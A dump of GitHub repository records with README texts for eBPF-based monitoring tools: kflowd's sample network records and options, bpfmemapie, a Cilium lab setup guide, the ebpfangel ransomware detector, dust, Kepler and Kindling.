  ""InfoTimestamp"": ""Thu, Apr 04 2024 15:39:11.463732866 UTC"",
  ""InfoMonitor"": ""socket"",
  ""InfoHostName"": ""dev.kflow.co"",
  ""InfoHostIP"": ""38.110.1.24"",
  ""InfoSystem"": ""Linux"",
  ""InfoKernel"": ""6.1.0-10-amd64"",
  ""InfoVersion"": ""kflowd-v0.9.1"",
  ""InfoUptime"": 23.972984597,
  ""ProcParent"": ""bash"",
  ""Proc"": ""curl"",
  ""ProcVersion"": ""7.45.2-3"",
  ""ProcUser"": ""dirk"",
  ""ProcGroup"": ""dirk"",
  ""ProcPPID"": 199853,
  ""ProcPID"": 199856,
  ""ProcTID"": 199857,
  ""ProcUID"": 1002,
  ""ProcGID"": 1002,
  ""ProcAge"": 0.044454620,
  ""SockProtocol"": ""UDP"",
  ""SockRole"": ""CLIENT"",
  ""SockState"": ""UDP_ESTABLISHED"",
  ""SockFamily"": ""AF_INET"",
  ""SockLocalIP"": ""38.110.1.24"",
  ""SockLocalPort"": 56664,
  ""SockRemoteIP"": ""8.8.4.4"",
  ""SockRemotePort"": 53,
  ""SockTxInterface"": ""4:enp5s0:0c:c4:7a:88:84:c2"",
  ""SockTxPackets"": 2,
  ""SockTxDuration"": 0.000048490,
  ""SockTxBytes"": 52,
  ""SockTxInterface"": ""4:enp5s0:0c:c4:7a:88:84:c2"",
  ""SockRxPackets"": 2,
  ""SockRxPacketsQueued"": 0,
  ""SockRxPacketsDrop"": 0,
  ""SockRxPacketsFrag"": 0,
  ""SockRxDuration"": 22.475134750,
  ""SockRxBytes"": 155,
  ""SockRxTTL"": 125,
  ""SockAge"": 0.043689149,
  ""App"": ""DNS"",
  ""AppTxDns"": [{
    ""_Timestamp"": 0.000001177,
    ""TransactionId"": 56864,
    ""OpCode"": ""QUERY"",
    ""Flags"": [""RD""],
    ""ResourceRecords"": [
      [""A"", ""kflow.co""]
    ]
  },
  {
    ""_Timestamp"": 0.000048627,
    ""TransactionId"": 52515,
    ""OpCode"": ""QUERY"",
    ""Flags"": [""RD""],
    ""ResourceRecords"": [
      [""AAAA"", ""kflow.co""]
    ]
  }],
  ""AppRxDns"": [{
    ""_Timestamp"": 0.037965555,
    ""TransactionId"": 52515,
    ""ResponseCode"": ""NOERROR"",
    ""Flags"": [""QR"", ""RD"", ""RA""],
    ""AnswerCount"": 0,
    ""ResourceRecords"": []
  },
  {
    ""_Timestamp"": 0.043688644,
    ""TransactionId"": 56864,
    ""ResponseCode"": ""NOERROR"",
    ""Flags"": [""QR"", ""RD"", ""RA""],
    ""AnswerCount"": 2,
    ""ResourceRecords"": [
      [""A"", ""kflow.co"", 600, ""IN"", ""15.197.142.173""],
      [""A"", ""kflow.co"", 600, ""IN"", ""3.33.152.147""]
    ]
  }]
}
```
</details>

<details open>
<summary>&nbsp;TCP + HTTP Networking Record</summary>

```
{
  ""InfoSequenceNumber"": 3,
  ""InfoTimestamp"": ""Thu, Apr 04 2024 15:39:11.928989997 UTC"",
  ""InfoMonitor"": ""socket"",
  ""InfoHostName"": ""dev.kflow.co"",
  ""InfoHostIP"": ""38.110.1.24"",
  ""InfoSystem"": ""Linux"",
  ""InfoKernel"": ""6.1.0-10-amd64"",
  ""InfoVersion"": ""kflowd-v0.9.1"",
  ""InfoUptime"": 24.873001288,
  ""ProcParent"": ""bash"",
  ""Proc"": ""curl"",
  ""ProcVersion"": ""7.45.2-3"",
  ""ProcUser"": ""dirk"",
  ""ProcGroup"": ""dirk"",
  ""ProcPPID"": 199853,
  ""ProcPID"": 216998,
  ""ProcTID"": 216998,
  ""ProcUID"": 1002,
  ""ProcGID"": 1002,
  ""ProcAge"": 0.114196829,
  ""SockProtocol"": ""TCP"",
  ""SockRole"": ""CLIENT"",
  ""SockState"": ""TCP_CLOSE"",
  ""SockFamily"": ""AF_INET"",
  ""SockLocalIP"": ""38.110.1.24"",
  ""SockLocalPort"": 43302,
  ""SockRemoteIP"": ""15.197.142.173"",
  ""SockRemotePort"": 80,
  ""SockTxInterface"": ""4:enp5s0:0c:c4:7a:88:84:c2"",
  ""SockTxDataPackets"": 1,
  ""SockTxPackets"": 6,
  ""SockTxPacketsRetrans"": 0,
  ""SockTxPacketsDups"": 0,
  ""SockTxFlags"": {
    ""SYN"": 1,
    ""ACK"": 3,
    ""PSH-ACK"": 1,
    ""FIN-ACK"": 1
  },
  ""SockTxDuration"": 0.057274799,
  ""SockTxBytes"": 72,
  ""SockTxBytesAcked"": 74,
  ""SockTxBytesRetrans"": 0,
  ""SockTxRTO"": 51,
  ""SockTxInterface"": ""4:enp5s0:0c:c4:7a:88:84:c2"",
  ""SockRxDataPackets"": 1,
  ""SockRxPackets"": 4,
  ""SockRxPacketsQueued"": 0,
  ""SockRxPacketsDrop"": 0,
  ""SockRxPacketsReorder"": 0,
  ""SockRxPacketsFrag"": 0,
  ""SockRxFlags"": {
    ""SYN-ACK"": 1,
    ""ACK"": 1,
    ""PSH-ACK"": 1,
    ""FIN-ACK"": 1
  },
  ""SockRxDuration"": 0.057197399,
  ""SockRxBytes"": 342,
  ""SockRxTTL"": 185,
  ""SockRTT"": 0.000450625,
  ""SockAge"": 0.057344028,
  ""App"": ""HTTP"",
  ""AppTxHttp"": [{
    ""_Timestamp"": 0.000876589,
    ""_Method"": ""GET"",
    ""_Url"": ""/"",
    ""_Version"": ""HTTP/1.1"",
    ""Host"": ""kflow.co"",
    ""User-Agent"": ""curl/7.88.1"",
    ""Accept"": ""*/*""
  }],
  ""AppRxHttp"": [{
    ""_Timestamp"": 0.056237469,
    ""_Version"": ""HTTP/1.1"",
    ""_Status"": 301,
    ""_Reason"": ""Moved Permanently"",
    ""Date"": ""Thu, 04 Apr 2024 15:49:12 GMT"",
    ""Content-Type"": ""text/html; charset=utf-8"",
    ""Content-Length"": ""59"",
    ""Connection"": ""keep-alive"",
    ""Location"": ""https://kflowd.github.io"",
    ""Server"": ""ip-10-123-123-119.ec2.internal"",
    ""X-Request-Id"": ""5c331cbe-fbe1-40ea-ba2b-989691e687a0"",
    ""_Body"": ""<a href=\""https://kflowd.github.io\"">Moved Permanently</a>.""
  }]
}
```
</details>

<details open>
<summary>&nbsp;UNIX Socket + SYSLOG Record</summary>

```
{
  ""InfoSequenceNumber"": 4,
  ""InfoTimestamp"": ""Mon, Sep 16 2024 14:30:19.409100980 UTC"",
  ""InfoMonitor"": ""socket"",
  ""InfoHostName"": ""dev.kflow.co"",
  ""InfoHostIP"": ""38.110.1.24"",
  ""InfoSystem"": ""Linux"",
  ""InfoKernel"": ""6.1.0-10-amd64"",
  ""InfoVersion"": ""kflowd-v0.9.11"",
  ""ProcParent"": ""cron"",
  ""Proc"": ""cron"",
  ""ProcVersion"": ""3.0pl1-137"",
  ""ProcUser"": ""root"",
  ""ProcGroup"": ""root"",
  ""ProcPPID"": 990,
  ""ProcPID"": 2122368,
  ""ProcTID"": 2122368,
  ""ProcUID"": 0,
  ""ProcGID"": 0,
  ""ProcAge"": 18.100170007,
  ""SockRole"": ""CLIENT"",
  ""SockAddress"": ""/run/systemd/journal/dev-log"",
  ""SockFamily"": ""AF_UNIX"",
  ""SockTxBytes"": 192,
  ""SockAge"": 18.095146325,
  ""App"": ""SYSLOG"",
  ""AppTxSyslog"": [{
    ""Facility"": ""Security/Authorization"",
    ""Severity"": ""Notice (5)"",
    ""Priority"": 85,
    ""Version"": 0,
    ""Timestamp"": ""Sep 16 14:30:01"",
    ""Appname"": ""CRON"",
    ""ProcId"": ""2122368"",
    ""Message"": ""pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)""
  },
  {
    ""Facility"": ""Security/Authorization"",
    ""Severity"": ""Informational (6)"",
    ""Priority"": 86,
    ""Version"": 0,
    ""Timestamp"": ""Sep 16 14:30:01"",
    ""Appname"": ""CRON"",
    ""ProcId"": ""2122368"",
    ""Message"": ""pam_unix(cron:session): session closed for user root""
  }]
}
```
</details>

### Runtime Requirements
Kernel 5.10+ compiled with:
- CONFIG_BPF=y
- CONFIG_KPROBES=y
- CONFIG_KRETPROBES=y
- CONFIG_DEBUG_INFO_BTF=y
- Maps (since 4.1+) to perform filesystem event aggregation in hash tables
- Ringbuffer (since 5.8+) to share data between kernel eBPF program and user-space application
- Global variables (since 5.5) for parameterization of application behavior
- vmlinux.h file in binary form at /sys/kernel/btf/vmlinux
- Libraries libelf and libz installed

### Runtime Performance Recommendations
Kernel 5.10+ compiled with Just-In-Time eBPF compiler (JIT):
- CONFIG_BPF_JIT=y

JIT system control settings enabled:
- net.core.bpf_jit_enable=1

The following link provides an overview of Linux distributions with eBPF CO-RE & BTF enabled by default:<br>
**[Linux Distributions w/ eBPF CO-RE & BTF](https://github.com/libbpf/libbpf#bpf-co-re-compile-once--run-everywhere)**

For high performance UDP output the following kernel network settings are recommended:
- sysctl -w net.core.rmem_max=134217728
- sysctl -w net.core.wmem_max=134217728

### Runtime Options
```
Usage:
  kflowd [-m file,socket] [-t IDLE,ACTIVE] [-e EVENTS] [-o json|json-min|table] [-v] [-c]
         [-p dns|http|syslog=PROTO/PORT,...] [-u IP:PORT] [-q] [-d] [-V] [-T TOKEN] [-P PATH]
         [-D PROCESS], [-l] [--legend], [-h] [--help], [--version]
  -m file,socket           Monitor only specified kernel subsystem (filesystem or sockets)
                             (default: all, option omitted!)
  -t IDLE,ACTIVE           Timeout in seconds for idle or active network sockets until export
                             (default: idle '15' seconds, active '1800' seconds)
  -e EVENTS                Max number of filesystem events per aggregated record until export
                             (default: disabled, '1': no aggregation)
  -o json                  Json output with formatting (default)
     json-min              Json output with minimal formatting
     table                 Tabular output with limited keys and no UDP output
  -v                       Version of executable files identified by installed package
                             (supported only for rpm- and deb-based package management)
  -c                       Checksum hashes of MD5 and SHA256 calculated for executables
  -p dns=PROTO/PORT,...    Port(s) examined for decoding of DNS application protocol
                             (default: 'dns=udp/53,tcp/53', disabled: 'dns=off')
  -p http=PROTO/PORT,...   Port(s) examined for decoding of HTTP application protocol
                             (default: 'http=tcp/80', disabled: 'http=off')
  -p syslog=PROTO/PORT,... Port(s) examined for decoding of SYSLOG application protocol
                             (default: 'syslog=udp/514,tcp/514,unix', disabled: 'syslog=off')
  -u IP:PORT,...           UDP server(s) IPv4 or IPv6 address to send json output to.
                           Output also printed to stdout console unless quiet option -q or
                             daemon mode -d specified
  -q                       Quiet mode to suppress output to stdout console
  -d                       Daemonize program to run in background
  -V                       Verbose output
                             Print eBPF load and co-re messages on start of eBPF program
                             to stderr console
  -T TOKEN                 Token specified on host to be included in json output
  -P PATH                  Path to search for kflowd plugin modules (default: '../lib/')
  -l, --legend             Show legend
  -h, --help               Show help
      --version            Show version
  -D PROCESS               Debug
                             Print ebpf kernel log messages of process or expiration queue to
                             kernel trace pipe (any process: '*', with quotes!, queue: 'q')
                             Use command:
                               'sudo cat /sys/kernel/debug/tracing/trace_pipe'

Examples:
  sudo ./kflowd                                                           # terminal mode
  sudo ./kflowd -m file,socket -v -c -u 1.2.3.4:2056,127.0.0.1:2057 -d    # daemon mode
  sudo ./kflowd -m socket -v -c -u 1.2.3.4:2056 -V -D '*'                 # debug mode
  sudo ./kflowd --legend                                                  # show legend
  sudo ./kflowd --version                                                 # show version
```

### Build Requirements
- Kernel version 5.10+ compiled with BTF for CO-RE:
  ```
  uname -a
  cat /boot/config-* | grep CONF"
mtardy/bpfmemapie,20,1,20,0,Go,A tool to render a pie chart of memory usage (bytes_memlock) of BPF maps on the system ðŸ¥§,2024-06-18T19:22:06Z,2025-08-25T13:17:00Z,4,"# bpfmemapie ðŸ¥§

A tool to render a pie chart of memory usage (bytes_memlock) of BPF maps on the
system. Sorry for the naming, it's for **mem**apie, me**map**ie and mema**pie**,
so BPF mem map pie.

## Installation

```shell
go install github.com/mtardy/bpfmemapie@latest
```

## Usage

It needs bpftool to be installed and to execute as root for bpftool to list the
maps and their info.

```shell
sudo bpfmemapie
```

After opening http://localhost:8080 (you can change the port with `--port`), you
should see something like this:

<img width=""1292"" alt=""output of bpfmemapie: a pie chart with the maps memory"" 
  src=""https://github.com/mtardy/bpfmemapie/assets/11256051/3b987551-34d2-4270-9421-4b84eff56415"">

The pie chart is interactive, you can click on the legend to hide/show entries
or hover on the pie to see the tooltip. You can also change how the ""others""
category using the `threshold` URL query, for example 
http://localhost:8080/?threshold=1.

## Alternative

If you don't need the pie chart part, you can just use `bpftool` and `jq` to
see the same statistics:

```shell
sudo bpftool map -j | jq ' group_by(.name) | map({name: .[0].name, total_bytes_memlock: map(.bytes_memlock | tonumber) | add, maps: length}) | sort_by(.total_bytes_memlock)'
```
"
aredan/ciliumlabs,14,3,14,0,Makefile,Quickstart to Cilium,2024-06-14T21:51:23Z,2025-10-01T18:24:26Z,34,"### Cilium LABs with Kind
This is based on https://github.com/chornberger-c2c/isovalent-cilium-lab/blob/main/lab.md with minor changes and all the steps together for easy follow-up.
More stuff will be added soon.

Why?

I know that Cilium offers hosted LABs for free, but here I'm just trying to play with the labs in a different way and without time constrain for lab completion.

### pre-requesities.
For all the LABs in this repo you will need Docker, Kind, kubectl and kind-cli.

### Docker installation.
Add the repo to your system.

Note that the following installation is for Debian, installing docker in Ubuntu is sligthly different, for more information check de offical [docker installation guide for ubuntu](https://docs.docker.com/engine/install/ubuntu/) 

```shell
# Add Docker's official GPG key:
sudo apt-get update
sudo apt-get install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:
echo \
  ""deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
  $(. /etc/os-release && echo ""$VERSION_CODENAME"") stable"" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
```

Install the package.

```shell
sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```

Add your user to the Docker group.

```shell
sudo adduser <user> docker
```

Test your Docker installation.

```shell
sudo docker run hello-world
```

### Kind Installation.


```shell
# see https://kind.sigs.k8s.io/docs/user/quick-start#installation
# For AMD64 / x86_64
[ $(uname -m) = x86_64 ] && curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.30.0/kind-linux-amd64
# For ARM64
[ $(uname -m) = aarch64 ] && curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.30.0/kind-linux-arm64
chmod +x kind
mv kind ~/bin  
```

> make sure that you have ~/bin/ in your $PATH

#### Inotify Settings.

```shell
# see https://kind.sigs.k8s.io/docs/user/known-issues/#pod-errors-due-to-too-many-open-files
sudo echo ""fs.inotify.max_user_watches=524288 "" >> /etc/sysctl.conf 
sudo echo ""fs.inotify.max_user_instances=512 ""  >> /etc/sysctl.conf  
sudo sysctl -p 
```

### kubectl
You need the kubectl binary to interact with K8s.

```shell
curl -LO ""https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl""
chmod +x kubectl
mv ./kubectl ~/bin/kubectl
```

### Cilium CLI Tool.
You need to install the cilium cli tool, in this case is easier to use the cilium cli instead of Helm.

```shell
CILIUM_CLI_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/cilium-cli/main/stable.txt)
CLI_ARCH=amd64
if [ ""$(uname -m)"" = ""aarch64"" ]; then CLI_ARCH=arm64; fi
curl -L --fail --remote-name-all https://github.com/cilium/cilium-cli/releases/download/${CILIUM_CLI_VERSION}/cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
sha256sum --check cilium-linux-${CLI_ARCH}.tar.gz.sha256sum
sudo tar xzvfC cilium-linux-${CLI_ARCH}.tar.gz /usr/local/bin
rm cilium-linux-${CLI_ARCH}.tar.gz{,.sha256sum}
```

```shell
cilium version --client
```
> Make sure you install cilium-cli v0.18.6 or later.


### Next steps.
Now you can continue to one of the fallowing configuration for testing different componentes of Cilium.

#### beginner lab
For a basic lab configuration go to [beginner/](beginner/README.md)

#### BGP lab
For BGP specific lab configuration go to [bgp/](bgp/README.md)

#### Mesh lab
If you want to do some Mesh go to [mesh/](mesh/README.md)"
TomasPhilippart/ebpfangel,68,16,68,4,Python,ðŸ Ransomware Detection using Machine Learning with eBPF for Linux.,2023-06-01T07:17:56Z,2025-10-08T22:49:04Z,39,"<a href=""https://ebpfangel.philippart.me/"">
<picture aling=""center"">
  <source media=""(prefers-color-scheme: dark)"" srcset=""docs/assets/ebpfangel-logo-white.png"">
  <img alt=""Logo"" src=""docs/assets/ebpfangel-logo-black.png"">
</picture>
</a>

<h2 align=""center"">
Ransomware Detection using Machine Learning with eBPF for Linux
</h2>

<p align=""center"">
  <img alt=""GitHub License"" src=""https://img.shields.io/github/license/TomasPhilippart/ebpfangel"">
  <a href=""https://ebpfangel.philippart.me/""><img alt=""Website"" src=""https://img.shields.io/website?url=https%3A%2F%2Febpfangel.philippart.me""></a>
</p>



<p align=""center"">
  Authors: <br>
  <a href=""https://www.linkedin.com/in/max-willers-53830b268"">Max Willers</a> â€¢
  <a href=""https://www.linkedin.com/in/tomasphilippart/"">TomÃ¡s Philippart</a>
</p>



<p align=""center"">
  <a href=""https://github.com/TomasPhilippart/ebpfangel/blob/main/docs/Ransomware_Detection_using_Machine_Learning_with_eBPF.pdf"">Paper</a> â€¢
  <a href=""https://github.com/TomasPhilippart/ebpfangel/blob/main/docs/ebpfangel-presentation.pdf"">Presentation slides</a>
</p>

---


<p align=""center"">
  <a href=""https://ebpfangel.philippart.me/"">Overview</a> â€¢
  <a href=""https://ebpfangel.philippart.me/simulator/"">Simulator</a> â€¢
  <a href=""https://ebpfangel.philippart.me/detector/"">Detector</a> â€¢
  <a href=""https://ebpfangel.philippart.me/machinelearning/"">Machine Learning</a>
</p>

---



```shell
$ git clone https://github.com/TomasPhilippart/ebpfangel.git
```

> :warning: **Not a final product**: This is the final result of a research project. It is not intended to be a final product/solution to use in any productions environment whatsoever, it is simply the byproduct of research and therefore is intended to use as so.

## Overview

**ebpfangel** is a ransomware detection system that leverages the power of eBPF and machine learning to provide real-time monitoring and protection against ransomware attacks on Linux-based systems. By integrating dynamic analysis techniques with the capabilities of eBPF, ebpfangel offers a flexible, low-overhead solution for identifying and mitigating ransomware threats.

## How it works

**ebpfangel** operates by attaching eBPF programs to key system calls and user-space functions. These programs are triggered by specific events, such as file operations and encryption activities, allowing for comprehensive monitoring of system behavior. The collected data is then processed and analyzed using machine learning algorithms to detect patterns indicative of ransomware activity.

### Key Features
- **Real-Time Monitoring**: eBPF programs are attached to tracepoints, kprobes, and uprobes within the Linux kernel and user-space applications, enabling real-time detection of ransomware activities.
- **Low Overhead**: eBPF provides a lightweight mechanism for extending kernel capabilities without the need for additional kernel modules or modifications.
- **Machine Learning Integration:** The system uses supervised machine learning to classify events and detect ransomware based on patterns in the monitored data.
- **Open Source**: The codebase is open-source, promoting transparency, collaboration, and further development by the security community.


## Contributing

To foster progress in the field of ransomware detection, collaboration and knowledge sharing within the research community are essential. Encouraging open collaboration, sharing of datasets, methodologies, and findings will enable researchers to collectively combat the growing threat of ransomware attacks. By fostering collaboration, we can pool resources and expertise to develop more advanced and robust ransomware detection techniques, ultimately enhancing the overall security posture against this persistent threat.

If you are forking this project for your own uses, please consider creating a Pull Request with your changes.

There are some [open (un-assigned) issues](https://github.com/TomasPhilippart/ebpfangel/issues) created that would be good for new comers and people who would like to contribute to the project.


## License

The MIT License (MIT). Please see [License File](https://github.com/TomasPhilippart/ebpfangel/blob/main/LICENSE) for more information.
"
danteslimbo/dust,6,1,6,0,C,,2024-06-18T02:26:32Z,2024-07-15T12:59:00Z,16,"# dust
`dust` is a [pwru](https://github.com/cilium/pwru) to trace io request
## Why dust?
As we all know, io requests initiated by processes go through a long process before they finally hit the disk, during which the io request is handled by the kworker. This asynchronous processing makes it very difficult to track io, so we start with the io request and track the io request's lifecycle.

`dust` tracks the io request returned by `blk_mq_alloc_request` and monitors how long it runs in all functions that call `struct request *`, giving a clearer picture of the io request lifecycle.
## TL;DR
Usage:

```shell
./dust -h
Usage: ./dust [options]
    Available options:
  -h, --help              show help
  -i, --interval uint32   set monitor time in seconds (default 10)
  -o, --ofile string      output file
  -p, --pid uint32        filter pid
  -v, --version           show version
```
Example: trace a process for 30 seconds.
```shell
sudo ./dust -p {the_process_you_want_to_trace} -i 30
```

## TODO
- [ ] kprobe filters.
- [ ] kprobe.multi supports.
- [x] output to files."
sustainable-computing-io/kepler,1393,216,1393,158,Go,"Kepler (Kubernetes-based Efficient Power Level Exporter) is a Prometheus exporter that measures energy consumption metrics at the container, pod, and node levels in Kubernetes clusters.",2022-02-01T19:48:56Z,2025-10-09T02:22:03Z,487,"# Kepler

[![GitHub license](https://img.shields.io/badge/License-Apache%202.0%20%7C%20GPL%202.0%20%7C%20BSD%202-blue.svg)](https://github.com/sustainable-computing-io/kepler/blob/main/LICENSES) [![codecov](https://codecov.io/gh/sustainable-computing-io/kepler/branch/main/graph/badge.svg?token=K9BDX9M86E)](https://codecov.io/gh/sustainable-computing-io/kepler/tree/main) [![CI Status](https://github.com/sustainable-computing-io/kepler/actions/workflows/push.yaml/badge.svg?branch=main)](https://github.com/sustainable-computing-io/kepler/actions/workflows/push.yaml) [![Releases](https://img.shields.io/github/v/tag/sustainable-computing-io/kepler)](https://github.com/sustainable-computing-io/kepler/releases)

Kepler (Kubernetes-based Efficient Power Level Exporter) is a Prometheus exporter that measures energy consumption metrics at the container, pod, and node level in Kubernetes clusters.

## ðŸš€ Major Rewrite: Kepler (0.10.0 and above)

**Important Notice:** Starting with version 0.10.0, Kepler has undergone a complete ground-up rewrite.
This represents a significant architectural improvement while maintaining the core mission of
accurate energy consumption monitoring for cloud-native workloads.

> ðŸ“¢ **Read the full announcement:** [CNCF Slack Announcement](https://cloud-native.slack.com/archives/C05QK3KN3HT/p1752049660866519)

### âœ¨ What's New in the Rewrite

**Enhanced Performance & Accuracy:**

- Dynamic detection of Nodes' RAPL zones - no more hardcoded RAPL zones
- More accurate power attribution based on active CPU usage (no more idle/dynamic for workloads)
- Improved VM, Container, and Pod detection with more meaningful label values
- Significantly reduced resource usage compared to old Kepler

**Reduced Security Requirements:**

- Requires only readonly access to host `/proc` and `/sys`
- No more `CAP_SYSADMIN` or `CAP_BPF` capabilities required
- Much fewer privileges than previous versions

**Modern Architecture:**

- Service-oriented design with clean separation of concerns
- Thread-safe operations throughout the codebase
- Graceful shutdown handling with proper resource cleanup
- Comprehensive error handling with structured logging

**Current Limitations:**

- Only supports Baremetal (platform power support in roadmap)
- Supports only RAPL/powercap framework
- No GPU power support yet

### ðŸ“š Migration & Legacy Support

**For New Users:** Use the current version (0.10.0+) for the best experience and latest features.

**For Existing Users:** If you need to continue using the old version:

- Pin your deployment to version `0.9.0` (final legacy release)
- Access the old codebase in the [archived branch](https://github.com/sustainable-computing-io/kepler/tree/archived)
- **Important:** The legacy version (0.9.x and earlier) is now frozen - no bug fixes or feature requests will be accepted for the old version

**Migration Note:** Please review the new configuration format and deployment methods below when upgrading to 0.10.0+.

## ðŸš€ Getting Started

> **ðŸ“– For comprehensive installation instructions, troubleshooting, and advanced deployment options, see our [Installation Guide](docs/user/installation.md)**

### âš¡ Quick Start

Choose your preferred method:

```bash
# ðŸ’» Local Development
make build && sudo ./bin/kepler

# âœ¨ Docker Compose (with Prometheus & Grafana)
cd compose/dev && docker-compose up -d

# ðŸ³ Kubernetes
helm install kepler manifests/helm/kepler/ --namespace kepler --create-namespace
```

## ðŸ“– Documentation

### User Documentation

- **[Installation Guide](docs/user/installation.md)** - Detailed installation instructions for all deployment methods
- **[Configuration Guide](docs/user/configuration.md)** - Configuration options and examples
- **[Metrics Documentation](docs/user/metrics.md)** - Available metrics and their descriptions

### Developer Documentation

- **[Architecture Documentation](docs/developer/design/architecture/)** - Complete architectural documentation including design principles, system components, data flow, concurrency model, and deployment patterns
- **[Power Attribution Guide](docs/developer/power-attribution-guide.md)** - How Kepler measures and attributes power consumption
- **[Developer Documentation](docs/developer/)** - Contributing guidelines and development workflow

For more detailed documentation, please visit the [official Kepler documentation](https://sustainable-computing.io/kepler/).

## ðŸ¤ Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For more detailed information about contributing to this project, please refer to our [CONTRIBUTING.md](CONTRIBUTING.md) file.

### Gen AI policy

Our project adheres to the Linux Foundation's Generative AI Policy, which can be viewed at [https://www.linuxfoundation.org/legal/generative-ai](https://www.linuxfoundation.org/legal/generative-ai).

## â­ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=sustainable-computing-io/kepler&type=Date)](https://www.star-history.com/#sustainable-computing-io/kepler&Date)

## ðŸ“ License

This project is licensed under the Apache License 2.0 - see the [LICENSES](LICENSES) for details.
"
Kindling-project/kindling,1051,159,1051,27,Go,eBPF-based Cloud Native Monitoring Tool,2021-12-27T06:16:38Z,2025-10-10T02:55:55Z,447,"# Kindling

[![License](https://img.shields.io/badge/license-Apache2.0-blue.svg)](https://github.com/KindlingProject/kindling/blob/main/LICENSE)
[![Doc](https://img.shields.io/badge/docs-latest-green.svg)](http://kindling.harmonycloud.cn/docs/overview-and-concepts/overview/) 
[![Go Report Card](https://goreportcard.com/badge/github.com/KindlingProject/kindling/collector)](https://goreportcard.com/report/github.com/KindlingProject/kindling/collector)

Visit our [Kindling website](http://kindling.harmonycloud.cn/) for more information.

## What is Kindling

Kindling is an eBPF-based cloud native monitoring tool, which aims to help users understand the app behavior from kernel to code stack. With **trace profiling**, we hope the user can understand the application's behavior easily and find the root cause in seconds. Besides trace profiling, Kindling provides an easy way to get an overview of network flows in the Kubernetes environment, and many built-in network monitor dashboards like TCP retransmit, DNS, throughput, and TPS. Not only as a network monitor, but Kindling is also trying to analyze one detail RPC call and get the following information, which can be found in network explore in chrome. And the usage is the same as network exploration in chrome, with which users can tell which part to dig into to find the root cause of the problem in the production environment.

![img](https://cdn.nlark.com/yuque/0/2021/png/749988/1633767195234-af2913c4-75d7-447d-99bb-bd1d815883ae.png)

## What is Kindling Trace-profiling
With traces, metrics, and logs, many issues still canâ€™t be understood easily. Trace-profiling is trying to integrate the OnCPU and OffCPU events within the traces and collect the logs output during the trace execution timeframe.

OnCPU events are just like the flame graph, but the code has been collected at the thread level instead of the process level. And the trace was executed by one thread, so users can understand how the trace was executing on the CPU.

OffCPU events are the opposite of OnCPU events. As for the trace analysis, most traces spend a lifetime waiting for the locks, database query, remote process call, file reading, or file writing. All of these events cause the thread in waiting status, and they are considered as OffCPU events.

So for trace profiling, how all threads were executed is recorded and can be replayed.
- The exact thread which executed the trace span is highlighted.
- The logs printed by each thread are collected and correlated to the relative thread with its timestamp.
- The code execution flame graph is correlated to the time series where the CPU is busy.
- The network-related metrics are correlated to the time series where the network syscalls are executing.
- The file-related metrics are correlated to the time series where the file syscalls are executing.

## Architecture

From a high-level view, the agent runs as DeamonSet in Kubernetes. It collects all syscalls and some other tracepoints. We use different exporters for different distributions. 
For example, we build a Prometheus exporter to export the data which can be stored in Prometheus and displayed in Grafana Plugin. But for the trace profiling module, the UI is different, that's a standalone module. 

![image.png](/docs/imgs/architecture.png)

## Linux kernel version support

The Kindling eBPF module depends on the kernel version which is newer than 4.14. But for trace-profiling, the kernel version has to be newer than 4.17, hoping with more work, the trace-profiling can work on older kernel versions. As an eBPF constraint, the eBPF module can't work for older kernel versions. But for the users who want to try the functionality with the old kernel, we use the kernel module from Sysdig open-source project with enhancement and verification. Basically, the idea is to use a kernel module for tracking the kernel tracepoints. Thanks to Sysdig open-source project, it provides a tracepoint instrument framework for older kernel versions.

For now, the kernel module works as expected as the eBPF module during our test except for trace-profiling, but it is recommended to use the eBPF module in the production environment as it is safer than the kernel module. In order to help the older kernel version user experience the eBPF magic, we also support the kernel model. And you are welcome to report issues with the kernel module. For functionality, the kernel module and eBPF module capture the same data and behave exactly the same. 

## Why do we build Kindling?

When we talk about observability, we already have plenty of tools to use, like Skywalking for tracing, ELK for logging, and Prometheus for metrics. Why do we need to build an eBPF-based monitoring tool?

The majority issue for user adoption of k8s is the complexity. For the applications on Kubernetes, we don't know the network flows between the services until we can instrument the apps. We can't tell which part to blame when there is a product issue arise. Do we configure Kubernetes correctly? Are there any bugs in the virtual network like Calico or Flannel that caused this problem? Does the application code cause this issue?

We are a company based in Hangzhou, China, and used to provide Kubernetes distribution for our customers. Our customers used to have those questions, and we don't have proper solutions to answer those questions.

APM(Application Performance Monitoring) is good for those applications in Java which can be instrumented automatically, while for the Go programs, the code has to be rewritten for instrumenting. And even if we adopt the APM solution, we still can't tell whether an issue is caused by network problems, and many issues canâ€™t be pinpoint the root cause easily.

We found it may be helpful that we triage the issue first by checking the issue from the network view to identify issues roughly like ""oh, it's a network problem, the code works fine, and we should dig into the configuration of calico"" or ""the infrastructure works fine, so the app code should be blamed, let's dig into the logs or the APM dashboard for further information"".

After we triage the issue, we need to pinpoint the root cause of the issue. That's why we need the trace-profiling module.

### Why eBPF?

The libpcap way of analyzing the flows in the Kubernetes environment is too expensive for the CPU and network. The eBPF way of data capture cost much less than libpcap. eBPF is the most popular technology to track the Linux kernel where the virtual network, built by veth-pair and iptables, works. So eBPF is a proper technique to be used for tracking how the kernel responds to application requests.

## Core Features

With the trace-profiling module, we can understand how ElasticSearch works easily. The following image shows how ElasticSearch is executing the `bulk insert` operation.

![trace-profiling](/docs/imgs/traceprofiling.png)

The next image shows a dependency map in Kubernetes. 

![img](https://cdn.nlark.com/yuque/0/2022/png/749988/1642572876088-c26396ac-e7bb-44e7-ae0c-cc96f3344cd8.png)

Kindling can be easily integrated with Prometheus, and we uses PromQL to query the data in the frontend, so it should be adopted easily. But due to the cardinality constraint of Prometheus, we group the detailed data into buckets which throw away the detailed information.

